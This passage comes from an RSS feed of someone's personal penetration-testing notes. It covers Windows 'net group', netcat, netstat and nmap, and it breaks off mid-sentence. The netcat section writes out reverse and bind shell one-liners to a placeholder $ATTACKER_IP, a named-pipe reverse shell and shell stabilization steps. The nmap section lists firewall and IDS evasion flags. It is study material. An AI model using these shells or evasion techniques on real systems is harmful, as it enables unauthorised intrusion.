&lt;code&gt;net group $GROUP /domain&lt;/code&gt; doesn't show which &lt;em&gt;domain&lt;/em&gt; groups are members of &lt;code&gt;$GROUP&lt;/code&gt;, and thus will miss domain admins whose membership is controlled by a nested group. The only way to retrieve a full list of users in a domain group is to use PowerShell.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20PowerShell.md&quot;&gt;Using PowerShell&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Equivalent%20Windows%20and%20UNIX%20Commands.md&quot;&gt;Equivalent Windows and *NIX Commands&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22net%22.md</guid>
		</item>
		<item>
			<title>Using "netcat"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22netcat%22.md</link>
			<description>&lt;p&gt;The netcat binary is &lt;em&gt;usually&lt;/em&gt; &lt;code&gt;nc&lt;/code&gt;, but some systems have it at &lt;code&gt;ncat&lt;/code&gt; or &lt;code&gt;netcat&lt;/code&gt; instead.&lt;/p&gt;&lt;p&gt;Note that the &lt;code&gt;-c&lt;/code&gt; and &lt;code&gt;-e&lt;/code&gt; flags are considered security risks (for obvious reasons!), and are disabled on some systems.&lt;/p&gt;&lt;h2 id=&quot;start-a-client&quot;&gt;Start a Client&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$HOST&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Some versions of netcat support a -e flag that hooks STDIN and STDOUT of an executable to the established network connection. So something like the following will establish a reverse shell:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; -e /bin/bash &lt;span class=&quot;va&quot;&gt;$HOST&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;start-a-server&quot;&gt;Start a Server&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; -l -p &lt;span class=&quot;va&quot;&gt;$PORT&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$HOST&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The $HOST specification here is optional; if left off, nc binds to 0.0.0.0.&lt;/p&gt;&lt;p&gt;Note that nc will exit once the first connection closes.&lt;/p&gt;&lt;p&gt;(According to the nc docs, it looks like &lt;code&gt;nc -l $HOST $PORT&lt;/code&gt; should also work, but it doesn't. I think - though I haven't been able to verify - that what's happening here is that &lt;code&gt;-p&lt;/code&gt; specifies the port to &lt;em&gt;listen&lt;/em&gt; to, while the port following the $HOST specification is the port to &lt;em&gt;connect&lt;/em&gt; to.)&lt;/p&gt;&lt;p&gt;A netcat server doesn't have to be used just for reverse shells. For example, you can also use it to catch web requests in conjunction with XSS or SQLi attacks.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./XSS%20%28Cross-Site%20Scripting%29%20Attacks.md&quot;&gt;XSS (Cross-Site Scripting) Attacks&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./SQL%20Injection.md&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;useful-flags&quot;&gt;Useful Flags&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; - listen for incoming connections (rather than make an outgoing connection)&lt;/li&gt;&lt;li&gt;&lt;code&gt;-v&lt;/code&gt; - verbose&lt;/li&gt;&lt;li&gt;&lt;code&gt;-n&lt;/code&gt; - skip DNS resolution (slightly faster, less noisy on the network)&lt;/li&gt;&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; - specify the port to &lt;em&gt;listen&lt;/em&gt; to&lt;/li&gt;&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; - connect using UDP instead of TCP&lt;/li&gt;&lt;li&gt;&lt;code&gt;-k&lt;/code&gt; - keep listening even after client disconnects&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;example-attack-patterns&quot;&gt;Example Attack Patterns&lt;/h2&gt;&lt;p&gt;Example reverse shell:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Attacker: &lt;code&gt;nc -lvnp $LISTENER_PORT&lt;/code&gt;&lt;/li&gt;&lt;li&gt;Target: &lt;code&gt;nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Example bind shell:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Attacker: &lt;code&gt;nc $TARGET_IP $LISTENER_PORT&lt;/code&gt;&lt;/li&gt;&lt;li&gt;Target: &lt;code&gt;nc -lvnp $LISTENER_PORT -e /bin/bash&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;These are almost, but not quite, mirror images of each other.&lt;/p&gt;&lt;p&gt;The &lt;code&gt;-e&lt;/code&gt; switch isn't available on many UNIX-like OSes. Working around this leads to the common named pipe pattern:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mkfifo&lt;/span&gt; /tmp/p&lt;span class=&quot;kw&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; -lvnp &lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;lt;&lt;/span&gt; /tmp/p &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;/bin/sh&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/p &lt;span class=&quot;op&quot;&gt;2&amp;gt;&amp;amp;1&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-4&quot;&gt;&lt;a href=&quot;#cb4-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;rm&lt;/span&gt; /tmp/p&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;(Note that it's also possible to reverse the /bin/sh and nc portions of things; what important is that the named pipe lets us loop I/O between the two applications. See the discussion of msfvenom payloads for a detailed breakdown of this pattern.)&lt;/p&gt;&lt;p&gt;Initial netcat reverse shells (in particular web shells) are non-interactive.&lt;/p&gt;&lt;h3 id=&quot;shell-stabilization&quot;&gt;Shell &quot;Stabilization&quot;&lt;/h3&gt;&lt;p&gt;Shell &quot;stabilization&quot; refers to the process of making a remote shell behave like a normal local shell - so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc. In practice, this generally involves creating a &lt;em&gt;second&lt;/em&gt; connection from within the &quot;unstable&quot; shell, and then using that (keeping the first connection around just so you can restart the &quot;stabilized&quot; shell if you accidentally exit/kill it).&lt;/p&gt;&lt;p&gt;A common method of stabilizing netcat shells is to use Python:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Start an instance of bash connected to an actual PTY: &lt;code&gt;env TERM=xterm python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt;&lt;/li&gt;&lt;li&gt;Suspend the reverse shell.&lt;/li&gt;&lt;li&gt;Use &lt;code&gt;stty raw -echo; fg&lt;/code&gt; to switch to raw keycode transmission (so that things like arrow keys get pushed to our remote shell), turn off terminal echo (to prevent seeing commands twice), and foreground the reverse shell.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Note that the &lt;code&gt;stty&lt;/code&gt; command can be canceled using &lt;code&gt;reset&lt;/code&gt; (after closing the reverse shell). Since echo is turned off, typing this won't be visible. Trust the force!&lt;/p&gt;&lt;p&gt;The &lt;code&gt;rlwrap&lt;/code&gt; package will handle almost all of this for you.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;rlwrap&lt;/span&gt; -cAr nc -lvnp &lt;span class=&quot;va&quot;&gt;$PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or just use socat!&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt;: In &lt;em&gt;none&lt;/em&gt; of these cases will the reverse shell pick up on your terminal size, so you'll need to manually specify it using &lt;code&gt;stty rows&lt;/code&gt; and &lt;code&gt;stty cols&lt;/code&gt;.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22socat%22.md&quot;&gt;Using &quot;socat&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;port-forwarding&quot;&gt;Port Forwarding&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; -lvnp &lt;span class=&quot;va&quot;&gt;$INCOMING_PORT&lt;/span&gt; -c &lt;span class=&quot;st&quot;&gt;&amp;quot;nc &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$TARGET_IP&lt;/span&gt;&lt;span class=&quot;st&quot;&gt; &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$TARGET_PORT&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;other-uses&quot;&gt;Other Uses&lt;/h2&gt;&lt;h3 id=&quot;telnet-replacement&quot;&gt;Telnet Replacement&lt;/h3&gt;&lt;p&gt;If you just have netcat connect to a service directly, it functions exactly like telnet.&lt;/p&gt;&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;&lt;p&gt;With the &lt;code&gt;-z&lt;/code&gt; option, netcat will attempt to connect to all TCP ports on the targets in a sequential fashion (if no ports are specified; otherwise just to the specified port), reporting which are open. It's like a simple, very slow version of Nmap!&lt;/p&gt;&lt;p&gt;Use &lt;code&gt;-w&lt;/code&gt; to set the timeout in seconds.&lt;/p&gt;&lt;p&gt;Use &lt;code&gt;-u&lt;/code&gt; to try connecting over UDP rather than TCP.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;port-forwarding-1&quot;&gt;Port Forwarding&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; -lvkp &lt;span class=&quot;va&quot;&gt;$LOCAL_PORT&lt;/span&gt; -c &lt;span class=&quot;st&quot;&gt;&amp;quot;nc &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$REMOTE_IP&lt;/span&gt;&lt;span class=&quot;st&quot;&gt; &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$REMOTE_PORT&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22netcat%22.md</guid>
		</item>
		<item>
			<title>Using "netstat"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22netstat%22.md</link>
			<description>&lt;h2 id=&quot;flags&quot;&gt;Flags&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-a&lt;/code&gt; - all listening parts and established connections&lt;/li&gt;&lt;li&gt;&lt;code&gt;-i&lt;/code&gt; - per interface statistics&lt;/li&gt;&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; - only listening ports&lt;/li&gt;&lt;li&gt;&lt;code&gt;-n&lt;/code&gt; - do not attempt to resolve domain names&lt;/li&gt;&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; - protocol and service information, requires root to see everything&lt;/li&gt;&lt;li&gt;&lt;code&gt;-s&lt;/code&gt; - protocol statistics&lt;/li&gt;&lt;li&gt;&lt;code&gt;-t&lt;/code&gt; - show TCP ports only&lt;/li&gt;&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; - show UDP ports only&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22netstat%22.md</guid>
		</item>
		<item>
			<title>Using "nmap"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22nmap%22.md</link>
			<description>&lt;p&gt;Note that nmap accepts ranges in any octet of an IP address; for example, 10.10.0-255.1-255 will scan 10.10.0.1 â 10.10.255.255.&lt;/p&gt;&lt;p&gt;When dealing with firewalls, be aware that the default nmap SYN scan packet is 44 bytes = 20 bytes IP header + 24 bytes TCP header + 0 bytes data. Note that packet fragmentation only effects the TCP header + data - the 20 byte IP header will always be sent!&lt;/p&gt;&lt;p&gt;Most nmap scans will generate ~2x the number of packets as scanned ports, as unresponsive ports are sent a second packet to verify that they're actually closed (and, in general, most ports will be closed).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./TCP%20Protocol.md&quot;&gt;TCP Protocol&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;useful-flags&quot;&gt;Useful Flags&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-A&lt;/code&gt; - &quot;Aggressive&quot; scan; alias for &lt;code&gt;-O -sC -sV --traceroute&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-D&lt;/code&gt; - Send multiple scan requests using decoys; specified using a list of arbitrary IP addresses. The special &quot;addresses&quot; &lt;code&gt;ME&lt;/code&gt; and &lt;code&gt;RND&lt;/code&gt; represent the attacker (you!) and a random IP address, respectively. If &lt;code&gt;ME&lt;/code&gt; isn't included in the list, it will be inserted into a random position. Trades stealth for &quot;chaff&quot;. Maybe only useful as a diversion?&lt;/li&gt;&lt;li&gt;&lt;code&gt;-e&lt;/code&gt; - Specify the network interface to use during scanning.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-f&lt;/code&gt; - Fragment (TCP) packets into chunks of 8 bytes or less. Can help evade some next-gen firewall / IDS alarms.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-ff&lt;/code&gt; - Fragment (TCP) packets into chunks of 16 bytes or less. Can help evade some next-gen firewall / IDS alarms.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-F&lt;/code&gt; - &quot;Fast&quot; scan. Alias for &lt;code&gt;--top-ports 100&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-g&lt;/code&gt; - Use the specified source port number, rather than a random source port. Useful for bypassing some stateless firewalls.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-iL&lt;/code&gt; - Use a file for nmap's scan targets.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-n&lt;/code&gt; - Don't resolve host names using DNS (or do reverse DNS resolution).&lt;/li&gt;&lt;li&gt;&lt;code&gt;-O&lt;/code&gt; - OS detection. Generally requires at least one open and one closed port to be detected, and results will be distorted if the target is virtualized. The OS type is much more reliably detected than the OS version.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-p-&lt;/code&gt; - Scan all ports. (The end/beginning of port ranges can be excluded to represent 1/65535, so &lt;code&gt;-p-&lt;/code&gt; is equivalent to &lt;code&gt;-p1-65535&lt;/code&gt;.) If omitted, the 1000 most common ports are scanned by default.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-Pn&lt;/code&gt; - Scan the host even if it doesn't respond to an initial ping. &lt;em&gt;Necessary for scanning/discovering modern Windows systems, since the Windows Firewall blocks ICMP by default.&lt;/em&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;-r&lt;/code&gt; - Scan ports in sequential order (rather than randomly). Can make for more accurate scans for targets that have only recently been brought online.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-R&lt;/code&gt; - Perform reverse DNS resolution even for offline hosts.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sC&lt;/code&gt; - Scan with &quot;default&quot; script set; equivalent to &lt;code&gt;--script default&lt;/code&gt;. Mostly provides basic intelligence.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sV&lt;/code&gt; - Service detection. The same as &lt;code&gt;-sT&lt;/code&gt; (because a full TCP connection is required to gather the necessary information), but probes listening services for additional information.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-S&lt;/code&gt; - Use a spoofed IP address for the scan. Only useful if you can actually capture incoming packets at that IP address! Generally must be combined with the &lt;code&gt;-e&lt;/code&gt; and &lt;code&gt;-Pn&lt;/code&gt; flags.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-T&lt;/code&gt; - Specify timing from 0 â 5. &lt;code&gt;-T0&lt;/code&gt; will wait &lt;em&gt;5 minutes&lt;/em&gt; between ports. &lt;code&gt;-T1&lt;/code&gt; is typical on engagements. &lt;code&gt;-T3&lt;/code&gt; is the default. &lt;code&gt;-T4&lt;/code&gt; is typical on CTFs. &lt;code&gt;-T5&lt;/code&gt; is not recommended, as it is so fast that it may lead to packet loss.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-v&lt;/code&gt; - Increase nmap's verbosity. There are four verbosity levels for nmap: &lt;code&gt;-v&lt;/code&gt; &amp;lt; &lt;code&gt;-vv&lt;/code&gt; &amp;lt; &lt;code&gt;-d&lt;/code&gt; &amp;lt; &lt;code&gt;-dd&lt;/code&gt;. In practice, I've found anything above &lt;code&gt;-v&lt;/code&gt; too noisy for general use.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;There's more, but these are the big ones.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://nmap.org/book/man-port-scanning-basics.html&quot;&gt;Port Scanning Basics (Official Nmap Project Guide)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;long-flags&quot;&gt;Long Flags&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;--badsum&lt;/code&gt; - Produce packets with an invalid checksum. These should be dropped by normal hosts, but many IDS solutions &lt;em&gt;respond&lt;/em&gt; to these. This can be useful for reconnaissance.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--data-length&lt;/code&gt; - Append random data to nmap TCP packets to ensure that all packets are the same length. By default, nmap appends no data after the TCP header; padding this out &lt;em&gt;can&lt;/em&gt; make scans look more innocuous. Values &amp;lt; 24 only effect fragmented packets (since the TCP header is already 24 bytes). Disables protocol-specific payloads, which can decrease scan accuracy, particularly for UDP scans.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--dns-servers&lt;/code&gt; - Specify DNS server(s) to use for hostname resolution and reverse lookups.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--ip-options&lt;/code&gt; - Specify the IP &quot;Options&quot; field as either a string of hex-encoded bytes (&lt;code&gt;\x00&lt;/code&gt;, etc.) or &lt;em&gt;one&lt;/em&gt; of the shortcut options &lt;code&gt;R&lt;/code&gt; (record-route), &lt;code&gt;T&lt;/code&gt; (record-timestamp), &lt;code&gt;U&lt;/code&gt; (&lt;code&gt;R&lt;/code&gt; &lt;em&gt;and&lt;/em&gt; &lt;code&gt;T&lt;/code&gt;), &lt;code&gt;L&lt;/code&gt; (loose source routing), and &lt;code&gt;S&lt;/code&gt; (strict source routing). Both &lt;code&gt;L&lt;/code&gt; and &lt;code&gt;S&lt;/code&gt; must be followed by a space-separated list of IP addresses to route the packet through (the entire sting must be quoted), and are used to route around security appliances.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--max-parallelism&lt;/code&gt; - The maximum number of probes to run in parallel. Overrides &lt;code&gt;-T&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--max-rate&lt;/code&gt; - The maximum number of packets/second to send. Overrides &lt;code&gt;-T&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--min-parallelism&lt;/code&gt; - The minimum number of probes to run in parallel. Overrides &lt;code&gt;-T&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--min-rate&lt;/code&gt; - The minimum number of packets/second to send. Overrides &lt;code&gt;-T&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--mtu&lt;/code&gt; - Fragment packets into a chosen multiple of 8. Setting &lt;code&gt;--mtu 8&lt;/code&gt; is equivalent to &lt;code&gt;-f&lt;/code&gt;, and &lt;code&gt;--mtu 16&lt;/code&gt; is the same as &lt;code&gt;-ff&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--open&lt;/code&gt; - Only report back machines with open ports (most useful when used in conjunction with &lt;code&gt;-p&lt;/code&gt;).&lt;/li&gt;&lt;li&gt;&lt;code&gt;--proxies&lt;/code&gt; - Use an HTTP or SOCKS4 proxy. Specify a comma-separated list to chain proxies together.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--reason&lt;/code&gt; - Show the reason that nmap made a particular identification. Kinda fun.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--scan-delay&lt;/code&gt; - Add a delay (in milliseconds) between ports/hosts. Helpful for IDS evasion, but makes things &lt;em&gt;slow&lt;/em&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--scanflags&lt;/code&gt; - Specify the TCP flags used to probe ports during a scan using URG, PSH, RST, SYN, ACK, FIN (e.g., &lt;code&gt;--scanflags URGPSHFIN&lt;/code&gt; is the same as &lt;code&gt;-sX&lt;/code&gt;). Overrides the explicit scanning options in the following sections.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--script&lt;/code&gt; - Run specified scripts, or all scripts in a specified category (as applicable). Also accepts wildcard matches (e.g., &lt;code&gt;ftp*&lt;/code&gt;). See next section for script category breakdown.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--script-help&lt;/code&gt; - Return the &quot;help&quot; comment block at the top of a script file.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--source-port&lt;/code&gt; - Specify the source port for a scan. possibly useful to evade some firewall rules?&lt;/li&gt;&lt;li&gt;&lt;code&gt;--spoof-mac&lt;/code&gt; - Use a spoofed MAC address for the scan. Obviously only matters when you're on the same subnet as the target; otherwise has the same caveats as IP spoofing.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--top-ports&lt;/code&gt; - Scan only the X most common ports. Nmap's default is &lt;code&gt;--top-ports 1000&lt;/code&gt;. Can be useful for detecting locked-down hosts (use &lt;code&gt;--top-ports 10 -Pn&lt;/code&gt;). Overridden when using &lt;code&gt;-p&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--traceroute&lt;/code&gt; - Perform a traceroute between the attacker and target systems. Note that nmap's traceroute works in the opposite fashion (high TTL to low TTL) than traceroute/tracert. Note that most routers will not send ICMP TTL exceeded packets, and will thus show up as &lt;code&gt;*&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;--ttl&lt;/code&gt; - Set a custom TTL. Does not always work as you'd expect in my experience!&lt;/li&gt;&lt;li&gt;&lt;code&gt;--version-intensity&lt;/code&gt; - Determine how much service information to collect (and thus how noisy the associated probes will be) with &lt;code&gt;-sV&lt;/code&gt;. Ranges from 0 â 9; &lt;code&gt;--version-light&lt;/code&gt; is equivalent to 2, &lt;code&gt;--version-all&lt;/code&gt; is equivalent to 9.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Nmap has a ton of flags. Be sure to check the man page and official documentation!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://nmap.org/book/man-bypass-firewalls-ids.html&quot;&gt;Firewall/IDS Evasion and Spoofing (Official Nmap Project Guide)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;scripting-engine&quot;&gt;Scripting Engine&lt;/h3&gt;&lt;p&gt;Script categories:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;auth - Probes for information about service authentication and bypasses. Does not conduct brute-force attacks.&lt;/li&gt;&lt;li&gt;broadcast - Host/network probes using broadcast packets.&lt;/li&gt;&lt;li&gt;brute - Attempt to brute-force service credentials.&lt;/li&gt;&lt;li&gt;default - A curated list of fast, reliable scripts. Can also be called using -sC.&lt;/li&gt;&lt;li&gt;discovery - Gather additional information about scanned machines/ports.&lt;/li&gt;&lt;li&gt;dos - Scripts that may crash machines/services.&lt;/li&gt;&lt;li&gt;exploit - Attempt to actually exploit identified services.&lt;/li&gt;&lt;li&gt;external - Scripts that send data to third-party services.&lt;/li&gt;&lt;li&gt;fuzzer - Fuzz identified services.&lt;/li&gt;&lt;li&gt;intrusive - Scripts that may crash a service, generate lots of log messages, or are otherwise noise / may be considered malicious.&lt;/li&gt;&lt;li&gt;malware - Test for the possible presence of malware on the target.&lt;/li&gt;&lt;li&gt;safe - The opposite of &quot;intrusive&quot; - scripts that are unlikely to be noisy or perceived as malicious (no guarantees though).&lt;/li&gt;&lt;li&gt;version - Scripts called by -sV. Unlike &quot;default&quot;, this category cannot be called directly.&lt;/li&gt;&lt;li&gt;vuln - Check for potential vulnerabilities. I've found that scripts in this category generate a lot of false positives.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;You can also run your own scripts.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://nmap.org/book/nse-usage.html&quot;&gt;Nmap Scripting Engine Usage and Examples (Official Nmap Project Guide)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;host-discovery-options&quot;&gt;Host Discovery Options&lt;/h3&gt;&lt;p&gt;When called as the superuser, Nmap uses ARP for local host discovery and a combination of ICMP Echo, TCP SYN to 443, TCP ACK to 80, and ICMP Timestamp requests for remote host discovery.&lt;/p&gt;&lt;p&gt;When called as a normal user, Nmap has more limited options and uses TCP SYN packets sent for ports 80 and 443 for both local and remote host 